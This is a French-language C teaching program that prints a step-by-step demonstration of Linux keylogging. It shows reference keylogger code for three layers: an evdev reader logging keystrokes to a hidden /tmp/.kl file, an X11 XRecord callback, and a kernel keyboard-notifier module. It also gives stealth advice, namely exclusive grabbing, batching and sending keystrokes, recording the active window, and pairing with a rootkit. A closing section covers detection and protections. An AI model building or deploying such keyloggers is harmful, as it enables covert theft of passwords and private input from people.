/*
 * OBJECTIF  : Comprendre les techniques de keylogging sur Linux
 * PREREQUIS : Bases C, /dev/input, evdev, X11 events
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques de capture de frappes
 * clavier sur Linux : /dev/input/eventN, X11 events, /proc/bus,
 * et les formats de donnees. Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>

/*
 * Etape 1 : Architecture d'input Linux
 */
static void explain_input_stack(void) {
    printf("[*] Etape 1 : Pile d'input Linux\n\n");

    printf("    ┌──────────────────────────────────────────┐\n");
    printf("    │  Application (navigateur, terminal...)    │\n");
    printf("    ├──────────────────────────────────────────┤\n");
    printf("    │  X11 / Wayland                           │\n");
    printf("    │  XGrabKeyboard / wl_keyboard             │\n");
    printf("    ├──────────────────────────────────────────┤\n");
    printf("    │  libinput / evdev                        │\n");
    printf("    ├──────────────────────────────────────────┤\n");
    printf("    │  Input Subsystem (drivers)               │\n");
    printf("    │  struct input_event                      │\n");
    printf("    ├──────────────────────────────────────────┤\n");
    printf("    │  /dev/input/event0, event1, ...          │\n");
    printf("    │  (un par peripherique d'input)           │\n");
    printf("    ├──────────────────────────────────────────┤\n");
    printf("    │  Hardware (USB, PS/2, Bluetooth)         │\n");
    printf("    └──────────────────────────────────────────┘\n\n");

    printf("    Points d'interception possibles :\n");
    printf("    Niveau       | Methode           | Root ?\n");
    printf("    ─────────────|───────────────────|────────\n");
    printf("    /dev/input   | read() sur eventN | Oui\n");
    printf("    X11          | XGrabKey / XRecord | Non\n");
    printf("    LD_PRELOAD   | Hook de read()    | Non\n");
    printf("    Kernel (LKM) | keyboard_notifier | Oui\n");
    printf("    TTY          | TIOCSTI ioctl     | Oui\n\n");
}

/*
 * Etape 2 : Structure input_event
 */
static void explain_input_event(void) {
    printf("[*] Etape 2 : Structure input_event (evdev)\n\n");

    printf("    #include <linux/input.h>\n\n");
    printf("    struct input_event {\n");
    printf("        struct timeval time;  // timestamp\n");
    printf("        __u16 type;          // EV_KEY=1, EV_REL=2...\n");
    printf("        __u16 code;          // KEY_A=30, KEY_ENTER=28...\n");
    printf("        __s32 value;         // 0=release, 1=press, 2=repeat\n");
    printf("    };\n\n");

    printf("    sizeof(struct input_event) = 24 octets (64-bit)\n\n");

    printf("    Codes de touches courants :\n");
    printf("    Code | Touche    | Code | Touche\n");
    printf("    ─────|───────────|──────|──────────\n");
    printf("      1  | ESC       |  28  | ENTER\n");
    printf("      2  | 1         |  29  | L_CTRL\n");
    printf("     16  | Q         |  42  | L_SHIFT\n");
    printf("     17  | W         |  56  | L_ALT\n");
    printf("     18  | E         |  57  | SPACE\n");
    printf("     30  | A         |  14  | BACKSPACE\n");
    printf("     31  | S         |  15  | TAB\n");
    printf("     32  | D         |  58  | CAPSLOCK\n\n");
}

/*
 * Etape 3 : Trouver le clavier
 */
static void demo_find_keyboard(void) {
    printf("[*] Etape 3 : Trouver le peripherique clavier\n\n");

    printf("    Methode 1 : Lire /proc/bus/input/devices\n");
    printf("    ───────────────────────────────────\n");

    FILE *fp = fopen("/proc/bus/input/devices", "r");
    if (fp) {
        char line[256];
        char current_name[128] = {0};
        int is_keyboard = 0;

        while (fgets(line, sizeof(line), fp)) {
            if (line[0] == 'N' && strstr(line, "Name=")) {
                strncpy(current_name, line + 3, sizeof(current_name) - 1);
                current_name[strcspn(current_name, "\n")] = '\0';
                is_keyboard = (strstr(line, "eyboard") != NULL ||
                              strstr(line, "keyboard") != NULL);
            }
            if (line[0] == 'H' && strstr(line, "Handlers=") && is_keyboard) {
                char *ev = strstr(line, "event");
                if (ev) {
                    char event_dev[32] = {0};
                    sscanf(ev, "%31s", event_dev);
                    printf("    Clavier : %s -> /dev/input/%s\n",
                           current_name, event_dev);
                }
                is_keyboard = 0;
            }
        }
        fclose(fp);
    } else {
        printf("    (impossible de lire /proc/bus/input/devices)\n");
    }
    printf("\n");

    printf("    Methode 2 : Tester les capabilities\n");
    printf("    ───────────────────────────────────\n");
    printf("    // ioctl(fd, EVIOCGBIT(EV_KEY, size), bits)\n");
    printf("    // Verifier si les bits KEY_A, KEY_Z sont presents\n\n");

    /* Lister les devices /dev/input */
    printf("    Peripheriques /dev/input/ :\n");
    DIR *dir = opendir("/dev/input");
    if (dir) {
        struct dirent *entry;
        int count = 0;
        while ((entry = readdir(dir)) && count < 10) {
            if (strncmp(entry->d_name, "event", 5) == 0) {
                printf("      /dev/input/%s\n", entry->d_name);
                count++;
            }
        }
        closedir(dir);
        if (count == 0) printf("      (aucun peripherique event)\n");
    } else {
        printf("      (impossible d'ouvrir /dev/input)\n");
    }
    printf("\n");
}

/*
 * Etape 4 : Keylogger evdev (code reference)
 */
static void show_evdev_keylogger(void) {
    printf("[*] Etape 4 : Keylogger via /dev/input (code reference)\n\n");

    printf("    #include <linux/input.h>\n");
    printf("    #include <fcntl.h>\n\n");

    printf("    // Table de conversion keycode -> caractere\n");
    printf("    static const char *keymap[] = {\n");
    printf("        [KEY_A]     = \"a\",  [KEY_B]     = \"b\",\n");
    printf("        [KEY_C]     = \"c\",  [KEY_D]     = \"d\",\n");
    printf("        [KEY_SPACE] = \" \",  [KEY_ENTER] = \"\\n\",\n");
    printf("        // ... toutes les touches\n");
    printf("    };\n\n");

    printf("    int fd = open(\"/dev/input/event0\", O_RDONLY);\n");
    printf("    // Necessite root ou groupe 'input'\n\n");

    printf("    struct input_event ev;\n");
    printf("    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {\n");
    printf("        // Filtrer : type=EV_KEY(1), value=1(press)\n");
    printf("        if (ev.type == EV_KEY && ev.value == 1) {\n");
    printf("            if (ev.code < sizeof(keymap)/sizeof(keymap[0])\n");
    printf("                && keymap[ev.code]) {\n");
    printf("                // Logger la touche\n");
    printf("                FILE *log = fopen(\"/tmp/.kl\", \"a\");\n");
    printf("                fprintf(log, \"%%s\", keymap[ev.code]);\n");
    printf("                fclose(log);\n");
    printf("            }\n");
    printf("        }\n");
    printf("    }\n\n");

    printf("    // Pour un keylogger discret :\n");
    printf("    // - Utiliser EVIOCGRAB pour capturer exclusivement\n");
    printf("    //   (attention : bloque l'input pour les autres !)\n");
    printf("    // - Buffer les frappes et envoyer par lots\n");
    printf("    // - Ajouter le timestamp et la fenetre active\n\n");
}

/*
 * Etape 5 : Keylogger X11 (userspace)
 */
static void explain_x11_keylogger(void) {
    printf("[*] Etape 5 : Keylogger via X11\n\n");

    printf("    Methode 1 : XRecord extension\n");
    printf("    ───────────────────────────────────\n");
    printf("    #include <X11/extensions/record.h>\n\n");
    printf("    // Enregistrer un callback pour les evenements clavier\n");
    printf("    XRecordRange *range = XRecordAllocRange();\n");
    printf("    range->device_events.first = KeyPress;\n");
    printf("    range->device_events.last  = KeyRelease;\n\n");
    printf("    XRecordContext ctx = XRecordCreateContext(...);\n");
    printf("    XRecordEnableContext(display, ctx, callback, NULL);\n\n");
    printf("    // Le callback recoit chaque evenement clavier\n");
    printf("    void callback(XPointer priv, XRecordInterceptData *data) {\n");
    printf("        if (data->category == XRecordFromServer) {\n");
    printf("            xEvent *event = (xEvent *)data->data;\n");
    printf("            KeyCode keycode = event->u.u.detail;\n");
    printf("            // Convertir keycode -> keysym -> string\n");
    printf("        }\n");
    printf("    }\n\n");

    printf("    Avantages par rapport a evdev :\n");
    printf("    - Pas besoin de root\n");
    printf("    - Acces au nom de la fenetre active\n");
    printf("    - Conversion keycode -> caractere via Xlib\n\n");

    printf("    Methode 2 : xinput (outil CLI)\n");
    printf("    ───────────────────────────────────\n");
    printf("    xinput test <device-id>\n");
    printf("    // Affiche les evenements clavier en temps reel\n\n");

    printf("    Limitations sur Wayland :\n");
    printf("    - XRecord ne fonctionne PAS\n");
    printf("    - Isolation des applications\n");
    printf("    - Necessite /dev/input ou un hook kernel\n\n");
}

/*
 * Etape 6 : Keylogger kernel (LKM)
 */
static void explain_kernel_keylogger(void) {
    printf("[*] Etape 6 : Keylogger au niveau kernel\n\n");

    printf("    Methode : keyboard notifier\n");
    printf("    ───────────────────────────────────\n");
    printf("    #include <linux/keyboard.h>\n");
    printf("    #include <linux/notifier.h>\n\n");

    printf("    static int key_notify(struct notifier_block *nb,\n");
    printf("                          unsigned long code, void *param) {\n");
    printf("        struct keyboard_notifier_param *kp = param;\n");
    printf("        if (code == KBD_KEYSYM && kp->down) {\n");
    printf("            // kp->value contient le keysym\n");
    printf("            char c = kp->value & 0xFF;\n");
    printf("            // Logger le caractere\n");
    printf("        }\n");
    printf("        return NOTIFY_OK;\n");
    printf("    }\n\n");

    printf("    static struct notifier_block kb_nb = {\n");
    printf("        .notifier_call = key_notify,\n");
    printf("    };\n\n");

    printf("    // Dans module_init :\n");
    printf("    register_keyboard_notifier(&kb_nb);\n\n");

    printf("    // Dans module_exit :\n");
    printf("    unregister_keyboard_notifier(&kb_nb);\n\n");

    printf("    Avantages :\n");
    printf("    - Invisible pour les outils userspace\n");
    printf("    - Capture TOUT (X11, Wayland, TTY, SSH)\n");
    printf("    - Combine avec un rootkit pour se cacher\n\n");
}

/*
 * Etape 7 : Detection des keyloggers
 */
static void explain_detection(void) {
    printf("[*] Etape 7 : Detection des keyloggers\n\n");

    printf("    Detecter un keylogger evdev :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Verifier qui lit /dev/input/eventN\n");
    printf("       fuser /dev/input/event*\n");
    printf("       lsof /dev/input/event*\n\n");
    printf("    2. Verifier les EVIOCGRAB (capture exclusive)\n\n");

    printf("    Detecter un keylogger X11 :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Lister les contextes XRecord actifs\n");
    printf("    2. Verifier les extensions X11 chargees\n");
    printf("    3. Monitorer les connexions X11\n\n");

    printf("    Detecter un keylogger kernel :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Lister les keyboard notifiers\n");
    printf("       (necessite debugfs ou analyse memoire)\n");
    printf("    2. Verifier les modules charges (lsmod)\n");
    printf("    3. LKRG : detection de hooks\n\n");

    printf("    Protections :\n");
    printf("    - Wayland : isolation naturelle\n");
    printf("    - Permissions strictes sur /dev/input\n");
    printf("    - SELinux/AppArmor : restreindre les acces\n");
    printf("    - Chiffrement de saisie (certains password managers)\n");
    printf("    - Monitorer les appels ioctl sur /dev/input\n\n");
}

int main(void) {
    printf("[*] Demo : Keylogger Linux\n\n");

    explain_input_stack();
    explain_input_event();
    demo_find_keyboard();
    show_evdev_keylogger();
    explain_x11_keylogger();
    explain_kernel_keylogger();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
